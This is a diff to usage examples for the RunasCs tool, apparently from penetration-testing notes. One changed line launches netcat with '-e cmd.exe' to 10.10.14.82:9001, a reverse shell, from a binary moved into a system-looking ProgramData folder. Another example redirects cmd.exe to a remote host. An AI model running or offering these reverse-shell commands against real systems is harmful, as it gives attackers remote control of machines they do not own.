@@ -18,7 +18,7 @@ Packaged Runas utility - [RunasCs](https://github.com/antonioCoco/RunasCs)
 .\RunasCs.exe user1 password1 "cmd /c whoami /all" -d domain -l 8
 
 # Run a background process as a local user,
-.\RunasCs.exe user1 password1 "C:\Temp\nc.exe 10.10.14.82 9001 -e cmd.exe" -t 0
+.\RunasCs.exe user1 password1 "C:\ProgramData\System\nc.exe 10.10.14.82 9001 -e cmd.exe" -t 0
 
 # Redirect stdin, stdout and stderr of the specified command to a remote host
 .\RunasCs.exe user1 password1 cmd.exe -r 10.10.10.10:4444
